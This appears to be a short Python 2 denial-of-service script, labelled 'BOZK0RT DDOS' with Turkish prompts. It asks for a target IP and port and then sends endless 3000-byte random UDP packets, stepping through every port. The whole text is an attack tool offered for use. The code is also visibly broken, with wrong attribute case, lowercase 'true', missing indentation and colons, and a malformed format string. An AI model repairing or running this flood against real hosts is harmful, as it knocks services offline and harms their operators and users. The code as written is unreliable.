# bozk0rtddos
#!/usr/bin/env python
# _*_ coding: utf-8 _*_
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.sock_DGRAM)
bytes = random._urandom(3000)
os.system("clear")
banner = """"
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

          BOZK0RT DDOS
         
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
"""
print(banner)
ip = raw_input("hedef ip > ")
port = input ("hedef port > ")
os.system(" clear")
sent = 0
while true:
sock.sendto(bytes, (ip,port))
sent = sent + 1 
port = port + 1
print "............................................."
print "gönderilen paket -> %S /n bağlantı -> %S "x(sent,ip,port)
print "............................................."
if port == 65534
port = 1
